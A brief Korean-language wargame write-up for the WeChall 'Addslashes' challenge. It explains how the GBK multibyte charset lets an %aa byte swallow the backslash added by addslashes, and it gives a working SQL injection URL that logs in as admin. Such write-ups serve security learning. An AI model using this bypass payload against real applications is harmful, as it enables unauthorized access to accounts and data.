# [WeChall] Addslashes - Writeup

## SQL Injection

언뜻 보면 `addslashes` 함수 덕에 SQLi가 불가능해보인다.

하지만 자세히보니 `GBK` 라는 멀티바이트 언어셋을 사용하고 있다!

(국내 워게임에선 `GBK` 대신, 주로 `EUC-KR` 같은 언어셋이 사용되어 출제되곤 한다.)

e.g. `%aa%27` -> `%5c%aa%27` = `�'`

위 예제처럼, `addslashes` 함수가 `'`를 필터링 한답시고, 그 앞에 넣어준 `\`가 `%aa`와 결합하여 알 수 없는 문자(`�`)가 되어 버린다.

덕분에 `'`는 살아남게 되어 SQLi가 가능해진다.

[http://www.wechall.net/tr/challenge/addslashes/index.php?username=%aa%27||username=0x61646D696E%23&password=123&login=%E6%B3%A8%E5%86%8C](http://www.wechall.net/tr/challenge/addslashes/index.php?username=%aa%27||username=0x61646D696E%23&password=123&login=%E6%B3%A8%E5%86%8C)